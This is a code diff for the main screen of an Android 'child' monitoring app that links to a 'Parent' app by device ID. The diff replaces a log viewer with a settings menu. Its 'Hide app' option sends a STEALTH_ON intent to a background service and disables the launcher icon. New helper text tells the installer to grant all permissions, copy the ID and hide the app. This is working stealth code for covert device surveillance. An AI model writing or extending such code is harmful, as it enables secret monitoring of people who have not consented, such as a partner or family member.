@@ -1,19 +1,39 @@
 package com.soumo.child.ui
 
+import android.content.ComponentName
 import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
 import android.util.Log
 import androidx.compose.foundation.background
-import androidx.compose.foundation.horizontalScroll
-import androidx.compose.foundation.layout.*
-import androidx.compose.foundation.lazy.LazyColumn
-import androidx.compose.foundation.lazy.itemsIndexed
-import androidx.compose.foundation.lazy.rememberLazyListState
-import androidx.compose.foundation.rememberScrollState
-import androidx.compose.foundation.text.selection.SelectionContainer
+import androidx.compose.foundation.border
+import androidx.compose.foundation.layout.Arrangement
+import androidx.compose.foundation.layout.Box
+import androidx.compose.foundation.layout.Column
+import androidx.compose.foundation.layout.Row
+import androidx.compose.foundation.layout.Spacer
+import androidx.compose.foundation.layout.fillMaxSize
+import androidx.compose.foundation.layout.fillMaxWidth
+import androidx.compose.foundation.layout.height
+import androidx.compose.foundation.layout.padding
+import androidx.compose.foundation.layout.size
+import androidx.compose.foundation.layout.width
+import androidx.compose.foundation.layout.widthIn
+import androidx.compose.foundation.shape.RoundedCornerShape
+import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.rounded.Settings
 import androidx.compose.material3.CircularProgressIndicator
+import androidx.compose.material3.DropdownMenu
+import androidx.compose.material3.DropdownMenuItem
+import androidx.compose.material3.Icon
+import androidx.compose.material3.IconButton
 import androidx.compose.material3.Text
-import androidx.compose.runtime.*
-import androidx.compose.runtime.snapshots.SnapshotStateList
+import androidx.compose.runtime.Composable
+import androidx.compose.runtime.LaunchedEffect
+import androidx.compose.runtime.getValue
+import androidx.compose.runtime.mutableStateOf
+import androidx.compose.runtime.remember
+import androidx.compose.runtime.setValue
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
@@ -22,25 +42,24 @@ import androidx.compose.ui.text.buildAnnotatedString
 import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.style.TextAlign
-import androidx.compose.ui.text.style.TextOverflow
 import androidx.compose.ui.text.withStyle
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import com.soumo.child.MainActivity
 import com.soumo.child.id.DeviceIdManager
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.withContext
-import java.io.BufferedReader
-import java.io.InputStreamReader
 
 /**
  * ChildUI is the main UI of the child app.
- * It shows the Child ID from DeviceIdManager (if generated),
- * and a scrollable, color-coded log view.
+ * It shows the Child ID from DeviceIdManager (if generated), a status line,
+ * a bottom-left settings menu, and a bottom-right helper text.
  */
+
+private val DefaultFontSize = 14.sp
+
 @Composable
 fun ChildUI(
     context: Context,
-    logs: SnapshotStateList<String>
+    statusText: String
 ) {
     // Local state for childId
     var childId by remember { mutableStateOf<String?>(null) }
@@ -52,179 +71,149 @@ fun ChildUI(
                 .getString("device_id", null)
                 ?.also { Log.d("ChildUI", "Loaded from prefs: $it") }
     }
-
-    val colorDebug = Color(0xFF2196F3)
-    val colorInfo = Color(0xFF4CAF50)
-    val colorWarn = Color(0xFFFFA000)
-    val colorError = Color(0xFFD32F2F)
-    val colorFatal = Color(0xFFB000B0)
-
-    val listState = rememberLazyListState()
-    val maxLines = 500
-
-    // Logcat capture: only keep relevant lines
-    LaunchedEffect(Unit) {
-        withContext(Dispatchers.IO) {
-            try {
-                val process = Runtime.getRuntime().exec("logcat -v time *:V")
-                val reader = BufferedReader(InputStreamReader(process.inputStream))
-                var line: String?
-
-                while (reader.readLine().also { line = it } != null) {
-                    if (line != null &&
-                        (line.contains("DeviceID") ||
-                                line.contains("ChildUI") ||
-                                line.contains("BackgroundService"))) {
-
-                        withContext(Dispatchers.Main) {
-                            logs.add(line)
-                            if (logs.size > maxLines) {
-                                while (logs.size > maxLines) logs.removeAt(0)
-                            }
-                        }
-                    }
-                }
-            } catch (e: Exception) {
-                Log.e("ChildUI", "Logcat capture failed", e)
-            }
-        }
-    }
-
-    // Auto-scroll on new logs
-    LaunchedEffect(logs.size) {
-        if (logs.isNotEmpty()) {
-            listState.animateScrollToItem(logs.size - 1)
-        }
-    }
+    var menuExpanded by remember { mutableStateOf(false) }
 
     Column(
         modifier = Modifier
             .fillMaxSize()
-            .background(Color(0xFF121212))
-            .padding(12.dp)
+            .background(Color(0xFF000000))
+            .padding(24.dp)
     ) {
-        // Child ID header
+        // Centered ID and status
         Box(
             modifier = Modifier
                 .fillMaxWidth()
-                .heightIn(min = 48.dp)
-                .padding(vertical = 6.dp),
+                .weight(1f),
             contentAlignment = Alignment.Center
         ) {
-            if (childId == null) {
-                Row(
-                    verticalAlignment = Alignment.CenterVertically,
-                    horizontalArrangement = Arrangement.Center
-                ) {
-                    CircularProgressIndicator(
-                        strokeWidth = 2.dp,
-                        modifier = Modifier.size(18.dp)
-                    )
-                    Spacer(modifier = Modifier.width(10.dp))
+            Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                if (childId == null) {
+                    Row(
+                        verticalAlignment = Alignment.CenterVertically,
+                        horizontalArrangement = Arrangement.Center
+                    ) {
+                        CircularProgressIndicator(
+                            strokeWidth = 2.dp,
+                            modifier = Modifier.size(22.dp),
+                            color = Color(0xFFFFFFFF)
+                        )
+                        Spacer(modifier = Modifier.width(12.dp))
+                        Text(
+                            text = "Waiting for Child ID...",
+                            color = Color(0xFFBDBDBD),
+                            fontSize = 18.sp,
+                            fontFamily = FontFamily.Monospace,
+                            textAlign = TextAlign.Center
+                        )
+                    }
+                } else {
                     Text(
-                        text = "Waiting for Child ID...",
+                        text = DeviceIdManager.format(childId!!),
+                        color = Color(0xFFFFFFFF),
+                        fontSize = 36.sp,
+                        fontFamily = FontFamily.Monospace,
+                        fontWeight = FontWeight.Bold,
+                        textAlign = TextAlign.Center
+                    )
+                    Spacer(modifier = Modifier.height(8.dp))
+                    Text(
+                        text = statusText,
                         color = Color(0xFFBDBDBD),
                         fontSize = 16.sp,
                         fontFamily = FontFamily.Monospace,
                         textAlign = TextAlign.Center
                     )
                 }
-            } else {
+            }
+        }
+
+        // Bottom row: settings (left) and helper text (right)
+        Row(
+            modifier = Modifier.fillMaxWidth(),
+            horizontalArrangement = Arrangement.SpaceBetween,
+            verticalAlignment = Alignment.Bottom
+        ) {
+            // Bottom-left: Settings gear with dropdown
+            Box {
+                IconButton(onClick = { menuExpanded = true }) {
+                    Icon(
+                        imageVector = Icons.Rounded.Settings,
+                        contentDescription = "Settings",
+                        tint = Color.White
+                    )
+
+                }
+                DropdownMenu(expanded = menuExpanded, onDismissRequest = { menuExpanded = false }) {
+                    DropdownMenuItem(
+                        text = { Text("Request permissions") },
+                        onClick = {
+                            // No-op for now
+                            menuExpanded = false
+                        }
+                    )
+                    DropdownMenuItem(
+                        text = { Text("Hide app") },
+                        onClick = {
+                            menuExpanded = false
+                            try {
+                                val intent = Intent(context, com.soumo.child.BackgroundService::class.java)
+                                intent.action = "STEALTH_ON"
+                                context.startService(intent)
+                            } catch (e: Exception) {
+                                Log.e("ChildUI", "Failed to send STEALTH_ON intent", e)
+                            }
+                            try {
+                                val pm = context.packageManager
+                                val componentName = ComponentName(context, MainActivity::class.java)
+                                pm.setComponentEnabledSetting(
+                                    componentName,
+                                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                    PackageManager.DONT_KILL_APP
+                                )
+                            } catch (e: Exception) {
+                                Log.e("ChildUI", "Failed to hide launcher icon", e)
+                            }
+                        }
+                    )
+                }
+            }
+
+            Box(
+                modifier = Modifier
+                    .widthIn(max = 260.dp)
+                    .background(
+                        color = Color(0xFF252525), // faint translucent black
+                        shape = RoundedCornerShape(12.dp)
+                    )
+                    .border(
+                        width = 1.dp,
+                        color = Color(0xFFB60000), // neon red border
+                        shape = RoundedCornerShape(12.dp)
+                    )
+                    .padding(5.dp) // inner padding
+            ) {
+                val helperText = buildAnnotatedString {
+                    withStyle(
+                        SpanStyle(
+                            color = Color(0xFFFFFFFF),
+                            fontFamily = FontFamily.SansSerif,
+                            fontWeight = FontWeight.Normal,
+                            fontSize = DefaultFontSize
+                        )
+                    ) {
+                        append("Shhh… 🤫\n\n")
+                        append("Grant all permissions, copy the ID, and hide this app. 🫣\n")
+                        append("Use that ID in the Parent to connect. 👀\n\n")
+                        append("<< Click ⚙️ to manage permissions and hide the app.")
+                    }
+                }
+
                 Text(
-                    text = DeviceIdManager.format(childId!!),
-                    color = Color(0xFF69F0AE), // vivid green
-                    fontSize = 20.sp,
-                    fontFamily = FontFamily.Monospace,
-                    fontWeight = FontWeight.Bold,
-                    textAlign = TextAlign.Center
+                    text = helperText,
+                    textAlign = TextAlign.Center,
+                    modifier = Modifier.align(Alignment.Center)
                 )
             }
         }
-
-        Spacer(modifier = Modifier.height(8.dp))
-
-        // Logs viewer
-        SelectionContainer {
-            LazyColumn(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .weight(1f),
-                state = listState,
-                reverseLayout = false,
-                contentPadding = PaddingValues(bottom = 8.dp)
-            ) {
-                itemsIndexed(logs) { _, rawLine ->
-                    val parts = parseLogLine(rawLine)
-
-                    val msgColor = when (parts.level) {
-                        'D' -> colorDebug
-                        'I' -> colorInfo
-                        'W' -> colorWarn
-                        'E' -> colorError
-                        'F', 'A' -> colorFatal
-                        else -> colorInfo
-                    }
-
-                    val annotated = buildAnnotatedString {
-                        parts.tag?.let {
-                            withStyle(
-                                style = SpanStyle(
-                                    color = msgColor,
-                                    fontFamily = FontFamily.Monospace,
-                                    fontWeight = FontWeight.SemiBold
-                                )
-                            ) {
-                                append(it)
-                                append("  ")
-                            }
-                        }
-                        withStyle(
-                            style = SpanStyle(
-                                color = Color.White,
-                                fontFamily = FontFamily.Monospace
-                            )
-                        ) {
-                            append(parts.message ?: "")
-                        }
-                    }
-
-                    Row(
-                        modifier = Modifier
-                            .fillMaxWidth()
-                            .padding(vertical = 2.dp)
-                            .horizontalScroll(rememberScrollState())
-                    ) {
-                        Text(
-                            text = annotated,
-                            fontSize = 13.sp,
-                            maxLines = 1,
-                            overflow = TextOverflow.Visible
-                        )
-                    }
-                }
-            }
-        }
     }
-}
-
-private data class LogParts(
-    val level: Char? = null,
-    val tag: String? = null,
-    val message: String? = null
-)
-
-private fun parseLogLine(line: String): LogParts {
-    val regex = Regex("""^\s*(?:\d{2}-\d{2}|\d{4}-\d{2}-\d{2})\s+\d{2}:\d{2}:\d{2}\.\d{3}\s+([VDIWEAF])/([^:]+):\s*(.*)$""")
-    val m = regex.find(line)
-    if (m != null) {
-        val (lvl, tag, msg) = m.destructured
-        return LogParts(level = lvl.firstOrNull(), tag = tag.trim(), message = msg)
-    }
-    val regex2 = Regex("""^\s*([VDIWEAF])/([^:]+):\s*(.*)$""")
-    val m2 = regex2.find(line)
-    if (m2 != null) {
-        val (lvl, tag, msg) = m2.destructured
-        return LogParts(level = lvl.firstOrNull(), tag = tag.trim(), message = msg)
-    }
-    return LogParts(level = 'I', tag = null, message = line)
 }
